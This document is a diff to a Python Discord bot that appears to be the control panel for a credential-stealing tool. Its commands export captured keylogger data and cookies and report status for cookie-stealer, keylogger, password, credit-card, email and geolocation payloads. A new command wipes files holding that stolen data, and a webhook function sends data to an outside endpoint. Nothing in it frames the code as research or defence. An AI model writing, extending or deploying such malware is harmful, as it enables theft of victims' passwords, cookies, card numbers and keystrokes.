@@ -3,8 +3,8 @@ from discord import app_commands
 from discord.ext import commands
 import json
 import os
-import threading
 import requests
+import threading
 from datetime import datetime
 from colorama import Fore
 import sys
@@ -15,6 +15,7 @@ class DiscordBot:
         print(f"{Fore.YELLOW}[*] Initializing Discord bot...{Fore.RESET}")
         self.webhook_url = webhook_url
         self.token = token
+        self.running = True
         
         # Initialize bot with intents
         intents = discord.Intents.default()
@@ -26,14 +27,25 @@ class DiscordBot:
         self.bot.remove_command('help')
         
         # Setup commands
-        async def setup():
-            await self.setup_commands()
-        asyncio.run(setup())
+        self.setup_commands()
         
-        # Start bot
-        self.start()
+        # Start bot in a separate thread
+        self.bot_thread = threading.Thread(target=self.start)
+        self.bot_thread.daemon = True
+        self.bot_thread.start()
 
-    async def setup_commands(self):
+    def send_webhook(self, data):
+        try:
+            headers = {
+                'Content-Type': 'application/json'
+            }
+            response = requests.post(self.webhook_url, json=data, headers=headers)
+            if response.status_code not in [200, 204]:
+                print(f"{Fore.RED}[!] Webhook error: {response.status_code} - {response.text}{Fore.RESET}")
+        except Exception as e:
+            print(f"{Fore.RED}[!] Failed to send webhook: {str(e)}{Fore.RESET}")
+
+    def setup_commands(self):
         @self.bot.event
         async def on_ready():
             print(f"{Fore.GREEN}[+] Bot is ready as {self.bot.user.name}{Fore.RESET}")
@@ -58,8 +70,8 @@ class DiscordBot:
                     "/payloads": "View active/inactive payloads"
                 },
                 "📤 Data Export": {
-                    "/exportkl": "Export and clear keylogger data",
-                    "/exportck": "Export and clear cookies",
+                    "/exportkl": "Export keylogger data",
+                    "/exportck": "Export cookies",
                     "/exportall": "Export all captured data"
                 },
                 "⚙️ Control": {
@@ -160,41 +172,22 @@ class DiscordBot:
         @self.bot.hybrid_command(name="stop", description="Stop the proxy server")
         async def stop(ctx):
             await ctx.send("🛑 Stopping proxy server...")
+            self.running = False
             sys.exit(0)
 
-        @self.bot.hybrid_command(name="payloads", description="View payload status")
-        async def payloads(ctx):
-            payloads = {
-                "Cookie Stealer": True,
-                "Keylogger": True,
-                "Password Detector": True,
-                "Credit Card Detector": True,
-                "Email Detector": True,
-                "Geolocation": True
-            }
-            
-            embed = discord.Embed(
-                title="🔌 Payload Status",
-                description="Current status of all payloads",
-                color=0x00ff00
-            )
-            
-            for name, status in payloads.items():
-                embed.add_field(
-                    name=name,
-                    value=f"{'🟢 Active' if status else '🔴 Inactive'}",
-                    inline=True
-                )
-            
-            await ctx.send(embed=embed)
-
-    def send_webhook(self, data):
-        try:
-            response = requests.post(self.webhook_url, json=data)
-            if response.status_code != 204:
-                print(f"{Fore.RED}[!] Webhook error: {response.status_code}{Fore.RESET}")
-        except Exception as e:
-            print(f"{Fore.RED}[!] Failed to send webhook: {str(e)}{Fore.RESET}")
+        @self.bot.hybrid_command(name="clear", description="Clear all stored data")
+        async def clear(ctx):
+            try:
+                files = ['cookies.json', 'keylogs.json', 'creditcards.json', 
+                        'emails.json', 'passwords.json', 'geolocation.json']
+                
+                for file in files:
+                    with open(file, 'w') as f:
+                        json.dump([], f)
+                
+                await ctx.send("✅ All data cleared successfully!")
+            except Exception as e:
+                await ctx.send(f"Error: {str(e)}")
 
     def start(self):
         try:
@@ -202,3 +195,8 @@ class DiscordBot:
             self.bot.run(self.token)
         except Exception as e:
             print(f"{Fore.RED}[!] Bot error: {e}{Fore.RESET}")
+
+    def stop(self):
+        self.running = False
+        if self.bot:
+            asyncio.run_coroutine_threadsafe(self.bot.close(), self.bot.loop)
